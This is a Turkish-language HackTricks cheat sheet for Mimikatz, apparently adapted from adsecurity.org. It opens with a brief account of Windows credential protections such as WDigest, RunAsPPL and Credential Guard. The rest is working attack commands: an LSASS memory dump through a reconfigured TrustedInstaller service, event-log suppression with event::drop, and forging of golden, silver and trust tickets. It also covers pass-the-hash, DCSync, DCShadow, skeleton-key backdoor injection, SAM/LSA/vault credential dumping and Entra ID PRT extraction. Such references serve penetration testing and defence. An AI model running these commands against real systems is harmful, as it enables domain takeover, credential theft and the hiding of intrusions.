# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) üzerindeki bir sayfaya dayanmaktadır**. Daha fazla bilgi için orijinali kontrol edin!

## LM and Clear-Text in memory

Windows 8.1 ve Windows Server 2012 R2’den itibaren, kimlik bilgisi hırsızlığına karşı koruma sağlamak için önemli önlemler uygulanmıştır:

- **LM hashes ve düz metin şifreler**, güvenliği artırmak için artık bellekte saklanmaz. Digest Authentication’ı devre dışı bırakmak ve LSASS içinde "clear-text" şifrelerin önbelleğe alınmamasını sağlamak için belirli bir registry ayarı olan _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri olarak `0` yapılandırılmalıdır.

- **LSA Protection**, Local Security Authority (LSA) sürecini yetkisiz bellek okuma ve code injection’a karşı korumak için tanıtılmıştır. Bu, LSASS’in protected process olarak işaretlenmesiyle sağlanır. LSA Protection’ı etkinleştirmek için:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ registry’sinde `RunAsPPL` değerini `dword:00000001` olarak ayarlayın.
2. Bu registry değişikliğini yönetilen cihazlarda zorlayan bir Group Policy Object (GPO) uygulayın.

Bu korumalara rağmen, Mimikatz gibi araçlar belirli drivers kullanarak LSA Protection’ı aşabilir; ancak bu tür eylemler büyük olasılıkla event logs’a kaydedilir.

Modern workstations üzerinde bu daha da önemlidir çünkü **Credential Guard birçok Windows 11 22H2+ ve Windows Server 2025 domain-joined, non-DC sistemde varsayılan olarak etkindir**, ayrıca **LSASS-as-PPL yeni Windows 11 22H2+ kurulumlarında varsayılan olarak etkindir**. Pratikte bu, `sekurlsa::logonpasswords` komutunun çoğu zaman eski tradecraft’ın beklediğinden daha az veri döndürmesi anlamına gelir ve operatörler giderek daha fazla **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** veya **CloudAP/PRT odaklı modüller**e yönelir. Koruma tarafı için [Windows credentials protections](credentials-protections.md) bölümüne bakın.

### Counteracting SeDebugPrivilege Removal

Administrator’lar genellikle SeDebugPrivilege’e sahiptir ve bu da programları debug etmelerine olanak tanır. Bu privilege, saldırganların bellekteki credentials’ları çıkarmak için kullandığı yaygın bir teknik olan yetkisiz memory dumps’ı önlemek amacıyla kısıtlanabilir. Ancak, bu privilege kaldırılmış olsa bile, TrustedInstaller hesabı özelleştirilmiş bir service configuration kullanarak yine de memory dumps gerçekleştirebilir:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Bu, `lsass.exe` belleğinin bir dosyaya dökülmesine izin verir; ardından bu dosya başka bir sistemde kimlik bilgilerini çıkarmak için analiz edilebilir:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Seçenekleri

Mimikatz’te event log manipülasyonu iki temel eylemi içerir: event logları temizlemek ve yeni event’lerin kaydını engellemek için Event service’i patch’lemek. Aşağıda bu eylemleri gerçekleştirmek için komutlar verilmiştir:

#### Event Logları Temizleme

- **Komut**: Bu eylem, event logları silmeyi amaçlar ve kötü amaçlı aktiviteleri takip etmeyi zorlaştırır.
- Mimikatz, standart dokümantasyonunda event logları doğrudan command line üzerinden temizlemek için bir komut sunmaz. Ancak event log manipülasyonu genellikle belirli logları temizlemek için Mimikatz dışında sistem araçları veya scriptler kullanmayı içerir (ör. PowerShell veya Windows Event Viewer kullanarak).

#### Deneysel Özellik: Event Service’i Patch’lemek

- **Komut**: `event::drop`
- Bu deneysel komut, Event Logging Service’in davranışını değiştirmek ve etkili şekilde yeni event’leri kaydetmesini engellemek için tasarlanmıştır.
- Örnek: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` komutu, Mimikatz’in sistem service’lerini değiştirmek için gerekli yetkilerle çalışmasını sağlar.
- Ardından `event::drop` komutu Event Logging service’ini patch’ler.

### Kerberos Ticket Saldırıları

Aşağıdaki komutları hızlı syntax hatırlatıcıları olarak kullanın. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) ve [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) için ayrılmış sayfalar, güncel AES/PAC/opsec ayrıntılarını içerir.

### Golden Ticket Oluşturma

Golden Ticket, domain genelinde erişim taklidi yapılmasına izin verir. Temel komut ve parametreler:

- Komut: `kerberos::golden`
- Parametreler:
- `/domain`: Domain adı.
- `/sid`: Domain’in Security Identifier (SID)’ı.
- `/user`: Taklit edilecek kullanıcı adı.
- `/krbtgt`: Domain’in KDC service account’unun NTLM hash’i.
- `/ptt`: Ticket’ı doğrudan belleğe enjekte eder.
- `/ticket`: Ticket’ı daha sonra kullanım için kaydeder.

Örnek:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Oluşturma

Silver Ticket’ler belirli servislere erişim sağlar. Temel komut ve parametreler:

- Komut: Golden Ticket’a benzer, ancak belirli servisleri hedefler.
- Parametreler:
- `/service`: Hedeflenecek servis (ör. cifs, http).
- Diğer parametreler Golden Ticket ile benzerdir.

Örnek:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Oluşturma

Trust Tickets, trust ilişkilerinden yararlanarak domainler arasında kaynaklara erişim için kullanılır. Temel komut ve parametreler:

- Command: Golden Ticket'a benzer, ancak trust ilişkileri için.
- Parameters:
- `/target`: Hedef domainin FQDN'si.
- `/rc4`: trust account için NTLM hash.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Ek Kerberos Komutları

- **Ticket’ları Listeleme**:

- Komut: `kerberos::list`
- Geçerli kullanıcı oturumu için tüm Kerberos ticket’larını listeler.

- **Pass the Cache**:

- Komut: `kerberos::ptc`
- Cache dosyalarından Kerberos ticket’larını enjekte eder.
- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Komut: `kerberos::ptt`
- Bir Kerberos ticket’ının başka bir oturumda kullanılmasına izin verir.
- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Ticket’ları Purge Etme**:
- Komut: `kerberos::purge`
- Oturumdaki tüm Kerberos ticket’larını temizler.
- Ticket manipülasyon komutlarını kullanmadan önce çakışmaları önlemek için faydalıdır.

### Over-Pass-the-Hash / Pass-the-Key

Eğer `RC4` devre dışıysa veya güvenilmezse, Mimikatz yalnızca bir NT hash kullanmak yerine geçerli logon oturumuna **AES128/AES256 Kerberos key**’lerini patch edebilir. Bu, `sekurlsa::pth` komutunu sadece NTLM ile sınırlı görmektense, genellikle modern domain’ler için daha uygundur.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` mevcut işlemi yeniden kullanır, yeni bir console başlatmaz; bu, aynı bağlamda hemen `lsadump::dcsync` gibi şeyleri çalıştırmak istediğinizde kullanışlıdır.

### Active Directory Tampering

- **DCShadow**: Bir machine'i geçici olarak AD object manipulation için bir DC gibi davranacak şekilde yapın. Bkz. [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Password data istemek için bir DC'yi taklit eder. Bkz. [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA'dan credentials çıkarır.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Bir computer account'un password data'sını kullanarak bir DC'yi taklit eder.

- _NetSync için orijinal bağlamda belirli bir komut verilmemiştir._

- **LSADUMP::SAM**: Yerel SAM database'ine erişir.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry'de saklanan secrets'ları decrypt eder.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Bir user için yeni bir NTLM hash ayarlar.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication information alır.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** veya **hybrid-joined** host'larda, `sekurlsa::cloudap` LSASS içindeki önbelleğe alınmış **Primary Refresh Token (PRT)** materyalini açığa çıkarabilir. İlişkili Proof-of-Possession key software-protected ise, `dpapi::cloudapkd` sonraki **Pass-the-PRT** workflow'ları için gereken clear/derived key materyalini türetebilir.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Key TPM-backed olduğunda bu çok daha zor hale gelir, ancak hybrid endpoint’lerde kontrol etmeye değer çünkü cached CloudAP verisi klasik `wdigest` çıktısından daha ilginç olabilir. Cloud-side abuse zinciri için [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) bölümüne bakın.

### Miscellaneous

- **MISC::Skeleton**: Bir DC üzerindeki LSASS içine backdoor enjekte eder.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Backup rights elde eder.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug privileges elde eder.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Oturum açmış kullanıcıların credentials bilgilerini gösterir.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Bellekten Kerberos tickets çıkarır.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Orijinal bağlamda modify için belirli bir komut yok._

- **TOKEN::Elevate**: Token'ları impersonate eder.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Birden fazla RDP session'ına izin verir.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP session'larını listeler.
- _Orijinal bağlamda TS::Sessions için belirli bir komut verilmemiştir._

### Vault

- Windows Vault'tan passwords çıkarır.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
